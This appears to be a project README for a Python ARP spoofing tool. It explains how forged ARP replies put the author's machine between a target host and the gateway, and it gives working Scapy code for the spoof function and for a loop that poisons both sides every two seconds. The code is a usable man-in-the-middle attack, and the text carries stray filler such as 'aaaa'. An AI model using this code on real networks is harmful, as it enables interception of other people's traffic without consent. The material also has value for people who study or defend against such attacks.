# Arp_Spoof

Program in python to perform an attack technique in which an attacker sends ARP (Address Resolution Protocol) messages in order to associate your MAC address with the IP address of another host, such as the IP address of the default gateway, causing all traffic is sent to the attacker's IP address instead of the gateway's IP address.

## Used Modules

  * Scapy
  * optparse

## Scapy

The module is used to send and receive the ARP messages, in this case send responses to client, and the default gateway, this way the client will think that my host is the gateway and the gateway that i'm the client, and all the packet traffic will pass through my host
aaaa

```python
def spoof(target_ip, spoof_ip): 
    global mac 
    target_mac = mac
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
   
mac = get_mac(target_ip)
```
The function spoof receive like arguments the target_ip which is the IP that i want to send the responses pretending be another host, and the spoof_ip is the IP tha i want to pretend be. On the line 4 i create the packet that i'm gonna send to the target, with scapy.ARP(), putting the IP and MAC address of our target(the host) and putting the source IP like the spoof_ip(in this case the gateway), with that when the target reveive the response it will appear the IP of the authentic gateway, but actually my MAC address will be associated with this IP, and i'm gonna receive all the responses from it. The same thing will happen with the gateway to pretend be the authentic host.

```python
try:
   packets_sent_count = 0
   while True:
      spoof(target_ip, gateway_ip)
      spoof(gateway_ip , target_ip)
      packets_sent_count += 2
      print("\r[+] Packets sent: " + str(packets_sent_count), end="")
      time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C, Resetting ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)  
```
I have to send packets pretending being another host constantly, so i used one infinite loop (while True:), 
but I still put a 2 second of interval between sending packages to have at least control.<br>

With the exception when CTRL + C is typed the progam stops running, and use the restore functions to restore the ARP tables of the target host and the gateway.

